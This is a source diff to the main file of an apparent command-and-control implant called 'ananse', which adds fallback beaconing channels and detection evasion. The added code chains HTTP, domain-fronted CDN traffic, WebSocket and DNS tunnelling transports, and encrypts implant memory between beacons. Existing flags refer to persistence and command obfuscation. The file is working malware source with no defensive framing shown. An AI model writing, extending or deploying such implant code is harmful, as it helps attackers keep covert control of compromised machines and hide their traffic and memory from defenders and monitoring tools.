@@ -3,6 +3,7 @@ package main
 import (
 	"crypto/rand"
 	"encoding/hex"
+	"encoding/json"
 	"flag"
 	"fmt"
 	"os"
@@ -15,6 +16,7 @@ import (
 
 	"github.com/natx6/ananse/src/c2/implant/beacon"
 	"github.com/natx6/ananse/src/c2/implant/executor"
+	"github.com/natx6/ananse/src/c2/implant/transport"
 	"github.com/natx6/ananse/src/c2/implant/shell"
 	"github.com/natx6/ananse/src/c2/implant/stealth"
 	"github.com/natx6/ananse/src/c2/implant/watchdog"
@@ -34,6 +36,12 @@ func main() {
 	noPersistence := flag.Bool("no-persist", false, "Skip watchdog persistence install")
 	noObfuscate := flag.Bool("no-obfuscate", false, "Disable command obfuscation")
 	proxyAddr := flag.String("proxy", "", "SOCKS5 proxy address (e.g., socks5://127.0.0.1:9050)")
+	noSleepMask := flag.Bool("no-sleep-mask", false, "Disable sleep memory masking")
+	wsEnabled := flag.Bool("ws", false, "Enable WebSocket transport as fallback")
+	dnsDomain := flag.String("dns-domain", "", "DNS C2 domain (e.g. c2.example.com) for DNS transport fallback")
+	dnsResolver := flag.String("dns-resolver", "", "Custom DNS resolver IP:port for DNS transport")
+	frontURL := flag.String("front", "", "Domain front CDN URL (e.g. https://cdn.example.com)")
+	frontHost := flag.String("front-host", "", "Domain front Host header (the real C2 domain)")
 	flag.Parse()
 
 	if *token == "" {
@@ -94,7 +102,56 @@ func main() {
 
 	// Create client and task runner
 	client := beacon.NewClient(*serverURL, *token, id, *proxyAddr)
+
+	// -----------------------------------------------------------------------
+	// Transport chain setup
+	// -----------------------------------------------------------------------
+	var transports []transport.Transport
+
+	// Primary: HTTP (with optional SOCKS5 proxy)
+	httpTrans := transport.NewHTTP(*serverURL, *token, *proxyAddr)
+	transports = append(transports, httpTrans)
+
+	// Domain fronting (wraps HTTP if both --front and --front-host are set)
+	if *frontURL != "" && *frontHost != "" {
+		frontTrans := transport.NewDomainFront(*serverURL, *token, *frontURL, *frontHost)
+		transports = append(transports, frontTrans)
+		fmt.Printf("[ananse] domain fronting enabled: %s → %s\n", *frontURL, *frontHost)
+	}
+
+	// WebSocket fallback
+	if *wsEnabled {
+		wsTrans := transport.NewWS(*serverURL, *token)
+		if wsTrans != nil {
+			transports = append(transports, wsTrans)
+			fmt.Println("[ananse] WebSocket transport enabled")
+		}
+	}
+
+	// DNS fallback
+	if *dnsDomain != "" {
+		dnsTrans := transport.NewDNS(*dnsDomain, *dnsResolver)
+		transports = append(transports, dnsTrans)
+		fmt.Printf("[ananse] DNS transport enabled: %s\n", *dnsDomain)
+	}
+
+	if len(transports) == 1 {
+		client.SetBeaconFunc(transports[0].Beacon)
+		fmt.Println("[ananse] HTTP transport ready")
+	} else if len(transports) > 1 {
+		chain := transport.NewChain(transports...)
+		client.SetBeaconFunc(chain.Beacon)
+		fmt.Printf("[ananse] transport chain active (%d transports, automatic fallback)\n", len(transports))
+	}
+
 	runner := executor.NewTaskRunner()
+
+	// Sleep mask for in-memory encryption between beacons
+	var maskProvider *stealth.MaskProvider
+	if !*noSleepMask {
+		maskProvider = stealth.NewMaskProvider(*token)
+		fmt.Println("[ananse] sleep memory masking enabled")
+	}
 
 	// Track start time for uptime
 	startTime := time.Now()
@@ -206,7 +263,20 @@ func main() {
 		}
 		adjusted := stealth.BeaconIntervalForThreat(threatForInterval, base)
 		next := beacon.NextInterval(adjusted)
+
+		// Sleep mask: encrypt sensitive data during idle period
+		if maskProvider != nil {
+			pending := runner.PendingResults()
+			var rd []byte
+			if len(pending) > 0 {
+				rd, _ = json.Marshal(pending)
+			}
+			_ = maskProvider.Mask(*token, id, rd)
+		}
 		stealth.Sleep(next)
+		if maskProvider != nil {
+			_, _, _, _ = maskProvider.Unmask()
+		}
 	}
 }
 
